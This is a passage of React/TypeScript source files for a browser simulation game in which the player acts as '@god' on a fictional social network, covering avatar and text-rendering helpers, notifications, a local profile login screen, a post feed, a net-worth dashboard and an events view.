  if (!c) return { id, name: "deleted user", handle: "deleted", avatar: BOT_AV("?", "#333"), kind: "char" };
  return { id, name: c.displayName, handle: c.username, avatar: avatarFor(c), verified: c.verified, kind: "char", char: c };
}

export function Avatar({ src, size = 36, ring, className }: { src: string; size?: number; ring?: string; className?: string }) {
  return (
    // eslint-disable-next-line @next/next/no-img-element
    <img src={src} alt="" width={size} height={size} className={clsx("shrink-0 rounded-full bg-surface-2 object-cover", className)} style={{ width: size, height: size, boxShadow: ring ? `0 0 0 2px ${ring}` : undefined }} />
  );
}

export function Verified({ gold }: { gold?: boolean }) {
  return <BadgeCheck className={clsx("inline size-[15px] shrink-0", gold ? "text-gold" : "text-brand")} aria-label="verified" />;
}

export function NameLine({ w, nick, className }: { w: Who; nick?: string; className?: string }) {
  return (
    <span className={clsx("inline-flex min-w-0 items-center gap-1", className)}>
      <span className={clsx("truncate font-semibold", w.kind === "god" && "text-gold")}>{nick ?? w.name}</span>
      {w.verified && <Verified gold={w.kind === "god"} />}
      {w.kind === "bot" && <span className="rounded bg-brand px-1 text-[10px] font-bold leading-4 text-white"><Bot className="inline size-3" /> APP</span>}
      {w.char?.isMod && <Shield className="size-3.5 text-up" aria-label="moderator" />}
    </span>
  );
}

export function StanceChip({ c }: { c: Character }) {
  const i = STANCE_INFO[c.stance];
  return <span className="rounded-full px-2 py-0.5 text-[11px] font-medium" style={{ background: i.color + "22", color: i.color }}>{i.label}</span>;
}

export function Money({ v, sign, className }: { v: number; sign?: boolean; className?: string }) {
  return <span className={clsx("num", sign && (v >= 0 ? "text-up" : "text-down"), className)}>{fmtMoney(v, { sign })}</span>;
}

export function Spark({ data, w = 120, h = 32, color = "var(--gold)" }: { data: number[]; w?: number; h?: number; color?: string }) {
  if (data.length < 2) return <svg width={w} height={h} />;
  const mn = Math.min(...data), mx = Math.max(...data), r = mx - mn || 1;
  const pts = data.map((v, i) => `${(i / (data.length - 1)) * w},${h - ((v - mn) / r) * (h - 4) - 2}`).join(" ");
  return (
    <svg width={w} height={h} viewBox={`0 0 ${w} ${h}`} className="overflow-visible">
      <polyline points={pts} fill="none" stroke={color} strokeWidth="2" strokeLinejoin="round" />
    </svg>
  );
}

export function Section({ title, right, children, className }: { title: React.ReactNode; right?: React.ReactNode; children: React.ReactNode; className?: string }) {
  return (
    <section className={clsx("panel p-4", className)}>
      <div className="mb-3 flex items-center justify-between gap-2">
        <h2 className="text-[13px] font-semibold uppercase tracking-wider text-muted">{title}</h2>
        {right}
      </div>
      {children}
    </section>
  );
}

/** Text with @mentions, #tags and $TICKERS highlighted. */
export function RichText({ text, onTag, onUser }: { text: string; onTag?: (t: string) => void; onUser?: (h: string) => void }) {
  const parts = text.split(/(@[\w.]+|#[\w]+|\$[A-Z0-9]{2,})/g);
  return (
    <>
      {parts.map((p, i) =>
        i % 2 === 0 ? p : p.startsWith("@") ? (
          <button key={i} onClick={(e) => { e.stopPropagation(); onUser?.(p.slice(1)); }} className={clsx("rounded px-0.5 font-medium", p.toLowerCase() === "@god" ? "bg-gold/15 text-gold" : "bg-brand/15 text-brand")}>{p}</button>
        ) : (
          <button key={i} onClick={(e) => { e.stopPropagation(); onTag?.(p.replace(/^[#$]/, "")); }} className="text-brand hover:underline">{p}</button>
        ),
      )}
    </>
  );
}

export const go = (hash: string) => { if (typeof location !== "undefined") location.hash = hash; };

```

## src/components/views/Alerts.tsx
```tsx
"use client";
import { useEffect } from "react";
import { AtSign, Bell, CalendarClock, DollarSign, Newspaper, TrendingUp } from "lucide-react";
import { editWorld, useApp } from "../store";
import { go } from "../ui";
import { relTime } from "@/lib/sim/format";

const ICON = { mention: AtSign, trend: TrendingUp, news: Newspaper, event: CalendarClock, money: DollarSign, system: Bell };
export const linkTo = (l?: string) => {
  if (!l) return;
  const [k, a, ...rest] = l.split(":");
  const b = rest.join(":");
  if (k === "chirp") go(`/chirp/tag/${a}`); else if (k === "article") go(`/news/${a}`); else if (k === "event") go("/events"); else if (k === "lounge") go(`/lounge/${a}/${b}`);
};

export function Alerts() {
  const { world: w, now } = useApp();
  const s = w!;
  const list = s.notifications.filter((n) => n.t <= now).slice(-150).reverse();
  useEffect(() => () => { editWorld((x) => { const t = Date.now(); x.notifications.forEach((n) => { if (n.t <= t) n.read = true; }); }); }, []);
  return (
    <div className="h-full overflow-y-auto">
      <div className="mx-auto max-w-2xl p-3 md:p-6">
        <h1 className="mb-4 text-[24px] font-black">Notifications</h1>
        <div className="panel divide-y divide-line overflow-hidden">
          {list.map((n) => { const I = ICON[n.kind]; return (
            <button key={n.id} onClick={() => linkTo(n.link)} className={`flex w-full items-start gap-3 p-3 text-left hover:bg-surface-2 ${n.read ? "" : "bg-gold/[0.06]"}`}>
              <span className="mt-0.5 grid size-8 shrink-0 place-items-center rounded-full bg-surface-3"><I className="size-4 text-gold" /></span>
              <div className="min-w-0 flex-1"><div className="text-[14px]">{n.text}</div><div className="text-[11px] text-muted">{relTime(n.t, now)}</div></div>
              {!n.read && <span className="mt-2 size-2 rounded-full bg-gold" />}
            </button>
          ); })}
          {!list.length && <div className="p-6 text-center text-muted">Nothing yet.</div>}
        </div>
      </div>
    </div>
  );
}

```

## src/components/views/Auth.tsx
```tsx
"use client";
import { useState } from "react";
import { Crown, Lock, Trash2 } from "lucide-react";
import { newProfile, removeProfile, unlock, useApp } from "../store";
import type { Profile } from "@/lib/persistence/profiles";

export function AuthScreen() {
  const { profiles } = useApp();
  const [sel, setSel] = useState<Profile>();
  const [pass, setPass] = useState("");
  const [name, setName] = useState("God");
  const [np, setNp] = useState("");
  const [err, setErr] = useState("");
  const [creating, setCreating] = useState(!profiles.length);
  return (
    <main className="grid h-full place-items-center overflow-y-auto p-4" style={{ background: "radial-gradient(ellipse at top, #e8b84a22, transparent 60%)" }}>
      <div className="w-full max-w-md">
        <div className="mb-6 text-center">
          <Crown className="mx-auto size-12 text-gold" />
          <h1 className="gold-text mt-2 text-[40px] font-black tracking-tight">GOD</h1>
          <p className="text-muted">The Internet</p>
        </div>
        <div className="panel space-y-3 p-5">
          {!creating && profiles.map((p) => (
            <div key={p.id} className="flex items-center gap-2">
              <button onClick={async () => { setErr(""); if (!p.passHash) { await unlock(p, ""); } else setSel(p); }} className="flex flex-1 items-center gap-3 rounded-xl border border-line bg-surface-2 p-3 text-left hover:border-gold">
                <span className="grid size-10 place-items-center rounded-full bg-gold/20 text-gold">{p.name[0]}</span>
                <div className="flex-1"><div className="font-semibold">{p.name}</div><div className="text-[11px] text-muted">universe {p.seed}</div></div>
                {p.passHash && <Lock className="size-4 text-muted" />}
              </button>
              <button title="Delete profile" onClick={() => confirm(`Delete ${p.name} and its universe?`) && removeProfile(p.id)} className="p-2 text-muted hover:text-down"><Trash2 className="size-4" /></button>
            </div>
          ))}
          {sel && !creating && (
            <form onSubmit={async (e) => { e.preventDefault(); if (!(await unlock(sel, pass))) setErr("Wrong passcode"); }} className="flex gap-2">
              <input autoFocus type="password" value={pass} onChange={(e) => setPass(e.target.value)} placeholder={`Passcode for ${sel.name}`} className="input flex-1" />
              <button className="btn btn-gold">Unlock</button>
            </form>
          )}
          {creating ? (
            <form onSubmit={(e) => { e.preventDefault(); newProfile(name.trim() || "God", np); }} className="space-y-3">
              <label className="block"><span className="text-[11px] uppercase tracking-wider text-muted">Display name</span><input value={name} onChange={(e) => setName(e.target.value)} className="input mt-1 w-full" /></label>
              <label className="block"><span className="text-[11px] uppercase tracking-wider text-muted">Passcode (optional)</span><input type="password" value={np} onChange={(e) => setNp(e.target.value)} className="input mt-1 w-full" /></label>
              <button className="btn btn-gold w-full py-3">Become @god</button>
              {profiles.length > 0 && <button type="button" onClick={() => setCreating(false)} className="w-full text-[13px] text-muted">Back</button>}
            </form>
          ) : <button onClick={() => setCreating(true)} className="w-full py-1 text-[13px] text-brand">+ New universe</button>}
          {err && <p className="text-[13px] text-down">{err}</p>}
        </div>
        <p className="mt-4 text-center text-[11px] text-muted">Stored locally in this browser.</p>
      </div>
    </main>
  );
}

export function CatchUpScreen({ progress }: { progress: number }) {
  return (
    <main className="grid h-full place-items-center p-6">
      <div className="w-full max-w-sm text-center">
        <Crown className="mx-auto size-10 animate-pulse text-gold" />
        <div className="mt-3 font-semibold">The internet kept going without you…</div>
        <div className="mt-1 text-[13px] text-muted">Replaying what happened while you were away</div>
        <div className="mt-4 h-2 overflow-hidden rounded-full bg-surface-3"><div className="h-full rounded-full bg-gold transition-all" style={{ width: `${Math.round(progress * 100)}%` }} /></div>
        <div className="num mt-2 text-[12px] text-muted">{Math.round(progress * 100)}%</div>
      </div>
    </main>
  );
}

```

## src/components/views/Chirp.tsx
```tsx
"use client";
import clsx from "clsx";
import { MemeImage } from "../MemeImage";
import { memo, useState } from "react";
import { haptic } from "../App";
import { ArrowLeft, BarChart2, Heart, MessageCircle, Repeat2, Info, Flame, Play, Quote, Image as ImageIcon } from "lucide-react";
import type { Route } from "../App";
import { doPost, doPostAction, useApp } from "../store";
import { Avatar, NameLine, RichText, go, who } from "../ui";
import { trending } from "@/lib/sim/engine";
import { fmtCount, relTime } from "@/lib/sim/format";
import type { Post, WorldState } from "@/lib/sim/types";

export const visiblePosts = (s: WorldState, now: number) => s.posts.filter((p) => p.t <= now);

type CardProps = { s: WorldState; p: Post; now: number; compact?: boolean; onOpen?: () => void };
/** Posts are mutated in place as engagement grows, so the memo key is a signature of what the card shows. */
export function PostCard(props: CardProps) {
  const { p, now } = props;
  const sig = `${p.likes}|${p.reposts}|${p.replies}|${p.views}|${p.godLiked ? 1 : 0}|${p.godReposted ? 1 : 0}|${p.communityNote ? 1 : 0}|${relTime(p.t, now)}|${now - p.t < 5000 ? 1 : 0}`;
  return <PostCardMemo {...props} sig={sig} />;
}
const PostCardMemo = memo(PostCardImpl, (a, b) => a.sig === b.sig && a.p === b.p && a.s === b.s && a.compact === b.compact);
function PostCardImpl({ s, p, now, compact, onOpen }: CardProps & { sig: string }) {
  const a = who(s, p.authorId);
  const quoted = p.quoteOf ? s.posts.find((x) => x.id === p.quoteOf && x.t <= now) : undefined;
  const parent = p.replyTo ? s.posts.find((x) => x.id === p.replyTo) : undefined;
  const article = p.authorId.startsWith("o-") && p.title ? s.articles.find((x) => x.id === p.title) : undefined;
  const fresh = now - p.t < 5000;
  return (
    <article onClick={onOpen} className={clsx("cursor-pointer border-b border-line px-4 py-3 transition hover:bg-surface-2/50", fresh && "msg-in", p.authorId === "god" && "bg-gold/[0.04]")}>
      {parent && <div className="mb-1 ml-12 text-[12px] text-muted">Replying to <span className="text-brand">@{who(s, parent.authorId).handle}</span></div>}
      <div className="flex gap-3">
        <button aria-label={`${a.name}'s profile`} className="shrink-0 self-start" onClick={(e) => { e.stopPropagation(); if (a.kind === "char") go(`/u/${a.id}`); }}><Avatar src={a.avatar} size={40} ring={a.kind === "god" ? "var(--gold)" : undefined} /></button>
        <div className="min-w-0 flex-1">
          <div className="flex items-center gap-1 text-[14px]">
            <NameLine w={a} />
            <span className="truncate text-muted">@{a.handle} · {relTime(p.t, now)}</span>
          </div>
          {p.breaking && <div className="mt-1 inline-flex items-center gap-1 rounded bg-down px-1.5 py-0.5 text-[10px] font-bold tracking-wider text-white">BREAKING</div>}
          {p.title && !article && <div className="mt-0.5 text-[15px] font-semibold">{p.title}</div>}
          <div className="mt-0.5 whitespace-pre-wrap break-words text-[15px] leading-snug"><RichText text={p.text} onTag={(t) => go(`/chirp/tag/${t}`)} onUser={(h) => { const c = s.characters.find((x) => x.username === h); if (c) go(`/u/${c.id}`); }} /></div>
          {article && (
            <button onClick={(e) => { e.stopPropagation(); go(`/news/${article.id}`); }} className="mt-2 block w-full overflow-hidden rounded-xl border border-line text-left">
              <div className="h-24 w-full" style={{ background: `linear-gradient(135deg, ${a.color ?? "#333"}, #000)` }} />
              <div className="p-3"><div className="text-[12px] text-muted">{a.name}</div><div className="text-[14px] font-semibold">{article.headline}</div></div>
            </button>
          )}
          {p.media && !compact && <Media m={p.media} id={p.id} />}
          {quoted && (
            <div className="mt-2 rounded-xl border border-line p-3" onClick={(e) => { e.stopPropagation(); go(`/chirp/post/${quoted.id}`); }}>
              <div className="flex items-center gap-1.5 text-[13px]"><Avatar src={who(s, quoted.authorId).avatar} size={18} /><NameLine w={who(s, quoted.authorId)} /><span className="text-muted">@{who(s, quoted.authorId).handle}</span></div>
              <div className="mt-1 line-clamp-3 text-[14px]">{quoted.text}</div>
            </div>
          )}
          {p.communityNote && (
            <div className="mt-2 rounded-xl border border-line bg-surface-2 p-3 text-[13px]">
              <div className="mb-1 flex items-center gap-1.5 font-semibold"><Info className="size-4 text-brand" /> Readers added context</div>
              <div className="text-muted">{p.communityNote.replace(/^Readers added context:\s*/, "")}</div>
            </div>
          )}
          <div className="-ml-2 mt-1 flex max-w-md justify-between text-[12px] text-muted">
            <Act label={`Reply, ${p.replies} replies`} onClick={() => go(`/chirp/post/${p.id}?compose=reply`)} className="hover:text-brand"><MessageCircle className="size-[17px]" />{fmtCount(p.replies)}</Act>
            <Act label={p.godReposted ? "Undo repost" : "Repost"} pressed={p.godReposted} onClick={() => { haptic(8); doPostAction(p.id, "repost"); }} className={p.godReposted ? "text-up" : "hover:text-up"}><Repeat2 className="size-[17px]" />{fmtCount(p.reposts)}</Act>
            <Act label={p.godLiked ? "Unlike" : "Like"} pressed={p.godLiked} onClick={() => { haptic(8); doPostAction(p.id, "like"); }} className={p.godLiked ? "text-down" : "hover:text-down"}><Heart className={clsx("size-[17px]", p.godLiked && "react-pop fill-current")} />{fmtCount(p.likes)}</Act>
            <Act label="Quote" onClick={() => go(`/chirp/post/${p.id}?compose=quote`)} className="hover:text-brand"><Quote className="size-[16px]" /></Act>
            <span className="flex min-h-10 items-center gap-1 px-2" aria-label={`${p.views} views`}><BarChart2 className="size-4" />{fmtCount(p.views)}</span>
          </div>
        </div>
      </div>
    </article>
  );
}

function Act({ label, onClick, pressed, className, children }: { label: string; onClick: () => void; pressed?: boolean; className?: string; children: React.ReactNode }) {
  return <button aria-label={label} aria-pressed={pressed} onClick={(e) => { e.stopPropagation(); onClick(); }} className={clsx("flex min-h-10 min-w-10 items-center gap-1 rounded-full px-2 transition-colors active:scale-95", className)}>{children}</button>;
}

function Media({ m, id }: { m: NonNullable<Post["media"]>; id?: string }) {
  if (m.meme) return <MemeImage m={m.meme} id={id ?? "p"} className="mt-2 block w-full max-w-[420px] overflow-hidden rounded-xl border border-line [&_svg]:block [&_svg]:h-auto [&_svg]:w-full" />;
  return (
    <div className="relative mt-2 grid h-44 place-items-center overflow-hidden rounded-xl border border-line" style={{ background: `radial-gradient(circle at 30% 30%, hsl(${m.hue} 70% 55%), hsl(${(m.hue + 60) % 360} 60% 18%))` }}>
      {m.kind === "video" ? <Play className="size-10 text-white/80" /> : m.kind === "meme" ? <span className="px-6 text-center text-[20px] font-black uppercase text-white [text-shadow:0_2px_0_#000]">{m.label}</span> : <ImageIcon className="size-8 text-white/50" />}
    </div>
  );
}

export function TrendingPanel({ s, now, limit = 10 }: { s: WorldState; now: number; limit?: number }) {
  const tr = trending(s, now, limit);
  return (
    <div className="panel overflow-hidden">
      <div className="flex items-center justify-between px-4 pb-2 pt-3"><h3 className="text-[17px] font-bold">Trending</h3></div>
      {tr.map((t) => (
        <button key={t.topic.id} onClick={() => go(`/chirp/tag/${t.topic.tag}`)} className="block w-full px-4 py-2.5 text-left hover:bg-surface-2">
          <div className="flex items-center gap-1 text-[11px] text-muted">{t.rank} · {t.topic.about === "god" ? "Trending with @god" : t.topic.category}{t.topic.breaking && <span className="ml-1 rounded bg-down px-1 text-[9px] font-bold text-white">BREAKING</span>}</div>
          <div className={clsx("break-all font-semibold", t.topic.about === "god" && "text-gold")}>#{t.topic.tag}</div>
          <div className="flex items-center gap-1 text-[11px] text-muted"><Flame className="size-3" />{fmtCount(t.posts)} posts</div>
        </button>
      ))}
    </div>
  );
}

export function Chirp({ route }: { route: Route }) {
  const { world: w, now } = useApp();
  const s = w!;
  const [tab, setTab] = useState<"foryou" | "god" | "breaking">("foryou");
  const [text, setText] = useState("");
  const [n, setN] = useState(60);
  const tag = route.parts[0] === "tag" ? route.parts[1] : undefined;
  const postId = route.parts[0] === "post" ? route.parts[1] : undefined;
  const all = visiblePosts(s, now).filter((p) => p.platform === "chirp");
  const topic = tag ? s.topics.find((t) => t.tag === tag) : undefined;

  const feed = (() => {
    let f = all;
    if (tag) f = f.filter((p) => (topic && p.topicId === topic.id) || p.text.includes(`#${tag}`) || p.text.includes(`$${tag}`));
    else if (tab === "god") f = f.filter((p) => p.authorId === "god" || /@god\b/i.test(p.text) || s.topics.find((t) => t.id === p.topicId)?.about === "god");
    else if (tab === "breaking") f = f.filter((p) => p.breaking || p.authorId.startsWith("o-") || (p.likes > 20000));
    return f.slice(-400).reverse().slice(0, n);
  })();

  if (postId) return <PostDetail s={s} id={postId} now={now} compose={route.query.get("compose") as "reply" | "quote" | null} />;

  const post = () => { if (!text.trim()) return; haptic(10); doPost("chirp", text.trim()); setText(""); setTab("foryou"); };
  return (
    <div className="flex h-full justify-center overflow-y-auto">
      <div className="w-full max-w-[620px] border-x border-line">
        <div className="glass sticky top-0 z-10 border-b border-line">
          {tag ? (
            <div className="flex items-center gap-3 px-4 py-3">
              <button aria-label="Back" className="grid size-9 place-items-center rounded-full hover:bg-surface-2" onClick={() => go("/chirp")}><ArrowLeft className="size-5" /></button>
              <div><div className={clsx("text-[17px] font-bold", topic?.about === "god" && "text-gold")}>#{tag}</div><div className="text-[12px] text-muted">{topic ? topic.label : "search"}</div></div>
            </div>
          ) : (
            <div className="flex">
              {(["foryou", "god", "breaking"] as const).map((t) => (
                <button key={t} onClick={() => setTab(t)} className={clsx("flex-1 py-3.5 text-[14px] font-semibold", tab === t ? "text-fg" : "text-muted")}>
                  <span className={clsx("pb-3", tab === t && "border-b-4 border-brand")}>{t === "foryou" ? "For you" : t === "god" ? "@god" : "Breaking"}</span>
                </button>
              ))}
            </div>
          )}
        </div>
        {!tag && (
          <div className="flex gap-3 border-b border-line px-4 py-3">
            <Avatar src={who(s, "god").avatar} size={40} ring="var(--gold)" />
            <div className="flex-1">
              <textarea aria-label="Write a post" value={text} onChange={(e) => setText(e.target.value)} maxLength={280} rows={2} placeholder="What's happening, God?" className="w-full resize-none bg-transparent text-[17px] outline-none placeholder:text-muted" />
              <div className="flex items-center justify-between"><span className="text-[11px] text-muted">{280 - text.length}</span><button onClick={post} disabled={!text.trim()} className="btn btn-gold rounded-full disabled:opacity-40">Post</button></div>
            </div>
          </div>
        )}
        {feed.map((p) => <PostCard key={p.id} s={s} p={p} now={now} onOpen={() => go(`/chirp/post/${p.id}`)} />)}
        {feed.length === n && <button onClick={() => setN(n + 60)} className="w-full py-4 text-[13px] text-brand">Show more</button>}
        {!feed.length && <div className="p-8 text-center text-muted">Nothing here yet.</div>}
      </div>
      <div className="sticky top-0 hidden w-[340px] shrink-0 space-y-4 self-start p-4 lg:block">
        <TrendingPanel s={s} now={now} />
        <WhoToFollow s={s} />
      </div>
    </div>
  );
}

function WhoToFollow({ s }: { s: WorldState }) {
  const list = s.characters.filter((c) => c.influencer).sort((a, b) => b.followers - a.followers).slice(0, 4);
  return (
    <div className="panel p-4">
      <h3 className="mb-2 text-[17px] font-bold">Big accounts</h3>
      {list.map((c) => { const x = who(s, c.id); return (
        <button key={c.id} onClick={() => go(`/u/${c.id}`)} className="flex w-full items-center gap-2 py-2 text-left">
          <Avatar src={x.avatar} size={36} />
          <div className="min-w-0 flex-1"><NameLine w={x} className="text-[14px]" /><div className="truncate text-[12px] text-muted">@{c.username} · {fmtCount(c.followers)}</div></div>
        </button>
      ); })}
    </div>
  );
}

function PostDetail({ s, id, now, compose }: { s: WorldState; id: string; now: number; compose: "reply" | "quote" | null }) {
  const [text, setText] = useState("");
  const p = s.posts.find((x) => x.id === id);
  if (!p) return <div className="p-8 text-muted">Post not found (it may have been deleted).</div>;
  const replies = s.posts.filter((x) => x.replyTo === id && x.t <= now);
  const quotes = s.posts.filter((x) => x.quoteOf === id && x.t <= now);
  const mode = compose ?? "reply";
  const send = () => {
    const t = text.trim();
    if (!t) return;
    haptic(10);
    if (mode === "quote") { doPost("chirp", t, p.id); setText(""); go("/chirp"); }
    else { doPost("chirp", t, undefined, p.id); setText(""); }
  };
  return (
    <div className="flex h-full justify-center overflow-y-auto">
      <div className="w-full max-w-[620px] border-x border-line">
        <div className="glass sticky top-0 z-10 flex items-center gap-3 border-b border-line px-4 py-2"><button aria-label="Back" className="grid size-10 place-items-center rounded-full hover:bg-surface-2" onClick={() => history.back()}><ArrowLeft className="size-5" /></button><span className="font-bold">Post</span></div>
        <PostCard s={s} p={p} now={now} />
        <div className="flex gap-3 border-b border-line px-4 py-3">
          <Avatar src={who(s, "god").avatar} size={36} ring="var(--gold)" />
          <div className="flex-1">
            <div className="mb-1 flex gap-1.5 text-[12px]">
              {(["reply", "quote"] as const).map((m) => <button key={m} onClick={() => go(`/chirp/post/${p.id}?compose=${m}`)} className={clsx("min-h-8 rounded-full px-3 font-semibold", mode === m ? "bg-brand/20 text-brand" : "bg-surface-3 text-muted")}>{m === "reply" ? "Reply" : "Quote"}</button>)}
            </div>
            <textarea autoFocus={!!compose} aria-label={mode === "quote" ? "Quote post" : "Reply"} value={text} onChange={(e) => setText(e.target.value)} maxLength={280} rows={2} placeholder={mode === "quote" ? "Add a comment" : `Reply to @${who(s, p.authorId).handle}`} className="w-full resize-none bg-transparent text-[16px] outline-none placeholder:text-muted" />
            <div className="flex items-center justify-between"><span className="text-[11px] text-muted">{280 - text.length}</span><button onClick={send} disabled={!text.trim()} className="btn btn-gold rounded-full disabled:opacity-40">{mode === "quote" ? "Quote" : "Reply"}</button></div>
          </div>
        </div>
        {quotes.length > 0 && <div className="border-b border-line px-4 py-2 text-[13px] font-semibold text-muted">Quotes · {quotes.length}</div>}
        {quotes.map((q) => <PostCard key={q.id} s={s} p={q} now={now} onOpen={() => go(`/chirp/post/${q.id}`)} />)}
        <div className="border-b border-line px-4 py-2 text-[13px] font-semibold text-muted">Replies · {replies.length}</div>
        {replies.map((q) => <PostCard key={q.id} s={s} p={q} now={now} onOpen={() => go(`/chirp/post/${q.id}`)} />)}
        {!replies.length && <div className="p-6 text-center text-[13px] text-muted">No replies yet.</div>}
      </div>
    </div>
  );
}

```

## src/components/views/Dashboard.tsx
```tsx
"use client";
import { useApp } from "../store";
import { Money, Section, Spark, go } from "../ui";
import { netWorth } from "@/lib/sim/world";
import { trending } from "@/lib/sim/engine";
import { STANCE_INFO } from "@/lib/sim/characters";
import { fmtCount, fmtMoney, relAgo } from "@/lib/sim/format";
import type { Holding, Stance } from "@/lib/sim/types";

const KINDS: { k: Holding["kind"]; label: string; icon: string }[] = [
  { k: "business", label: "Businesses", icon: "🏢" }, { k: "investment", label: "Investments", icon: "📈" }, { k: "coin", label: "Coins", icon: "🪙" },
  { k: "property", label: "Properties", icon: "🏰" }, { k: "island", label: "Islands", icon: "🏝️" }, { k: "jet", label: "Jets", icon: "✈️" },
  { k: "vehicle", label: "Vehicles", icon: "🏎️" }, { k: "organization", label: "Organizations", icon: "🏛️" }, { k: "account", label: "Accounts", icon: "🏦" },
];

export function Dashboard() {
  const { world: w, now } = useApp();
  const s = w!;
  const p = s.player;
  const nw = netWorth(s);
  const hist = p.netWorthHistory.slice(-160).map((x) => x.v).concat(nw);
  const day = p.netWorthHistory.find((x) => x.t >= now - 864e5)?.v ?? hist[0];
  const chg = nw - day;
  const invest = p.holdings.filter((h) => h.kind === "investment" || h.kind === "coin").reduce((a, h) => a + h.value, 0);
  const tr = trending(s, now, 20);
  const godRank = tr.find((t) => t.topic.about === "god");
  const counts = new Map<Stance, number>();
  for (const c of s.characters) counts.set(c.stance, (counts.get(c.stance) ?? 0) + 1);
  const pos = s.characters.filter((c) => c.opinion > 25).length, neg = s.characters.filter((c) => c.opinion < -25).length;
  const glaze = Math.round((pos / s.characters.length) * 100);
  const community = s.servers.reduce((a, x) => a + (x.tags.includes("god") || x.bias > 0.2 ? x.memberCount : 0), 0);
  const yieldDay = p.holdings.reduce((a, h) => a + (h.yieldPerDay ?? 0), 0);

  return (
    <div className="h-full overflow-y-auto">
      <div className="mx-auto max-w-7xl space-y-4 p-3 md:p-6">
        <div className="flex flex-wrap items-end justify-between gap-3">
          <div>
            <div className="text-[12px] uppercase tracking-[0.2em] text-muted">The Empire of @god</div>
            <div className="gold-text num text-[40px] font-black leading-tight md:text-[56px]">{fmtMoney(nw)}</div>
            <div className="flex items-center gap-2 text-[14px]"><Money v={chg} sign /><span className="text-muted">({day ? ((chg / day) * 100).toFixed(2) : "0"}%) · 24h</span></div>
          </div>
          <div className="flex items-center gap-2"><button onClick={() => go("/god")} className="btn btn-gold">⚡ GOD MODE</button></div>
        </div>
        <div className="panel p-4"><Spark data={hist} w={1200} h={140} /><div className="mt-1 flex justify-between text-[11px] text-muted"><span>{p.netWorthHistory.length ? relAgo(p.netWorthHistory[Math.max(0, p.netWorthHistory.length - 160)].t, now) : ""}</span><span>now</span></div></div>
        <div className="grid grid-cols-2 gap-3 md:grid-cols-4 xl:grid-cols-8">
          {[
            ["Cash", fmtMoney(p.cash)], ["Investments", fmtMoney(invest)], ["Income / day", fmtMoney(yieldDay)], ["Followers", fmtCount(p.followers)],
            ["Community", fmtCount(community)], ["Reputation", `${p.reputation.toFixed(0)}/100`], ["Influence", `${p.influence.toFixed(0)}/100`],
            ["Trending", godRank ? `#${godRank.rank} ${godRank.topic.tag}` : "not trending"],
          ].map(([k, v]) => (
            <div key={k} className="panel p-3"><div className="text-[11px] uppercase tracking-wider text-muted">{k}</div><div className="num mt-1 truncate text-[18px] font-bold">{v}</div></div>
          ))}
        </div>
        <div className="grid gap-4 lg:grid-cols-3">
          <Section title="Holdings" className="lg:col-span-2" right={<span className="text-[12px] text-muted">{p.holdings.length} assets</span>}>
            <div className="grid gap-3 sm:grid-cols-2">
              {KINDS.map(({ k, label, icon }) => { const hs = p.holdings.filter((h) => h.kind === k); if (!hs.length) return null; return (
                <div key={k} className="rounded-xl border border-line bg-surface-2/50 p-3">
                  <div className="mb-2 flex items-center justify-between"><span className="font-semibold">{icon} {label}</span><Money v={hs.reduce((a, h) => a + h.value, 0)} className="text-[13px] text-gold" /></div>
                  {hs.slice(-6).map((h) => <div key={h.id} className="flex justify-between gap-2 py-0.5 text-[13px]"><span className="truncate text-fg/85">{h.name}{h.employees ? <span className="text-muted"> · {fmtCount(h.employees)} staff</span> : null}</span><Money v={h.value} className="shrink-0 text-muted" /></div>)}
                </div>
              ); })}
            </div>
          </Section>
          <div className="space-y-4">
            <Section title="Glaze meter">
              <div className="flex items-end gap-2"><span className="num text-[36px] font-black text-gold">{glaze}%</span><span className="pb-2 text-[12px] text-muted">of the internet likes you · {Math.round((neg / s.characters.length) * 100)}% can&apos;t stand you</span></div>
              <div className="mt-2 flex h-3 overflow-hidden rounded-full">
                {[...counts.entries()].sort((a, b) => STANCE_INFO[b[0]].base - STANCE_INFO[a[0]].base).map(([k, n]) => <div key={k} title={`${STANCE_INFO[k].label}: ${n}`} style={{ width: `${(n / s.characters.length) * 100}%`, background: STANCE_INFO[k].color }} />)}
              </div>
              <div className="mt-2 flex flex-wrap gap-x-3 gap-y-1 text-[11px]">{[...counts.entries()].map(([k, n]) => <span key={k}><span className="mr-1 inline-block size-2 rounded-full" style={{ background: STANCE_INFO[k].color }} />{STANCE_INFO[k].label} {n}</span>)}</div>
            </Section>
            <Section title="Recent moves">
              <div className="space-y-2">{p.history.slice(-8).reverse().map((h, i) => <div key={i} className="text-[13px]"><div>{h.text}</div><div className="text-[11px] text-muted">{relAgo(h.t, now)}</div></div>)}{!p.history.length && <button onClick={() => go("/god")} className="text-[13px] text-muted">No moves yet. Open GOD MODE and give them something to talk about.</button>}</div>
            </Section>
          </div>
        </div>
      </div>
    </div>
  );
}

```

## src/components/views/Events.tsx
```tsx
"use client";
import { useState } from "react";
import { doEvent, toast, useApp } from "../store";
import { Avatar, Section, go, who } from "../ui";
import { relTime } from "@/lib/sim/format";

export function Events() {
  const { world: w, now } = useApp();
  const s = w!;
  const [last, setLast] = useState<string>();
  const evs = s.events.filter((e) => e.t <= now);
  const open = evs.filter((e) => !e.resolved && e.expiresAt > now).reverse();
  const past = evs.filter((e) => e.resolved || e.expiresAt <= now).reverse().slice(0, 30);
  return (
    <div className="h-full overflow-y-auto">
      <div className="mx-auto max-w-3xl space-y-4 p-3 md:p-6">
        <h1 className="text-[24px] font-black">Situations</h1>
        {last && <div className="panel border-gold/40 p-3 text-[14px]">{last}</div>}
        {!open.length && <div className="panel p-6 text-center text-muted">No open situations. The internet will find something soon.</div>}
        {open.map((e) => { const f = e.fromId ? who(s, e.fromId) : undefined; return (
          <div key={e.id} className="panel pop p-4">
            <div className="flex items-start gap-3">
              {f && <button onClick={() => go(`/u/${f.id}`)}><Avatar src={f.avatar} size={40} /></button>}
              <div className="flex-1"><div className="font-bold">{e.title}</div><div className="mt-0.5 text-[14px] text-fg/85">{e.body}</div><div className="mt-1 text-[11px] text-muted">{relTime(e.t, now)} · expires in {e.expiresAt - now > 36e5 ? `${Math.round((e.expiresAt - now) / 36e5)}h` : `${Math.max(1, Math.round((e.expiresAt - now) / 6e4))}m`}</div></div>
            </div>
            <div className="mt-3 grid gap-2 sm:grid-cols-3">
              {e.choices.map((c) => (
                <button key={c.id} onClick={() => { const r = doEvent(e.id, c.id); if (r && !("error" in r)) { setLast(`${e.title} → ${c.label}: ${r.outcome}`); toast(r.outcome); } }} className="rounded-xl border border-line bg-surface-2 p-3 text-left hover:border-gold">
                  <div className="text-[14px] font-semibold">{c.label}</div><div className="text-[12px] text-muted">{c.hint}</div>
                </button>
              ))}
